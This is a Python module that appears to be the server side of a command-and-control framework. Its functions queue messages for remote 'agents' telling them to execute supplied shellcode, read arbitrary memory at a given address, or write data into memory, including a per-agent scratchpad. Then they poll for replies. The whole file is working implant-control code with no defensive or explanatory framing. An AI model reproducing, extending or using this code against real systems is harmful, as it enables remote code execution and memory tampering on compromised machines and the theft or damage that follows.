from models.request import Request
from models.agent import Agent

import time

responses = {}

def send_and_wait(agent_id, shellcode):
    from routes.anon.agent import handle_msg_type, requests as agent_requests
    global responses
    shell_len = len(shellcode).to_bytes(8, byteorder="little")
    shellcode = bytearray(shell_len + shellcode) # Shellcode size
    shellcode.insert(0, 0x01) # Exec
    agent_requests[agent_id] = shellcode
    while True:
        print(f"Sending and waiting {agent_id}")
        time.sleep(0.05)
        if agent_id in responses.keys() and responses.get(agent_id) is not None:
            break
    response_data = handle_msg_type(agent_id)
    return response_data

def read_from_agent(agent_id, memory, size):
    from routes.anon.agent import handle_msg_type, requests as agent_requests
    global responses
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(size.to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes
    data_blob.insert(0, 0x2) # Read
    agent_requests[agent_id] = data_blob
    while True:
        if agent_id in responses.keys() and responses.get(agent_id) is not None:
            break
    response_data = handle_msg_type(agent_id)
    return response_data

def read_scratchpad(agent_id, size):
    agent_obj = Agent.by_id(agent_id)
    return read_from_agent(agent_id, agent_obj.scratchpad, size)



def write_to_agent(agent_id, memory, data):
    print(f"Writing to agent {agent_id}")
    from routes.anon.agent import handle_msg_type, requests as agent_requests
    global responses
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(len(data).to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes + data
    data_blob.insert(0, 0x3) # Write
    agent_requests[agent_id] = data_blob
    while True:
        time.sleep(0.05)
        if agent_id in responses.keys() and responses.get(agent_id) is not None:
            break
    response_data = handle_msg_type(agent_id)
    return response_data

def write_scratchpad(agent_id, data):
    print(f"Writing to scratchpad for agent {agent_id}")
    agent_obj = Agent.by_id(agent_id)
    return write_to_agent(agent_id, agent_obj.scratchpad, data)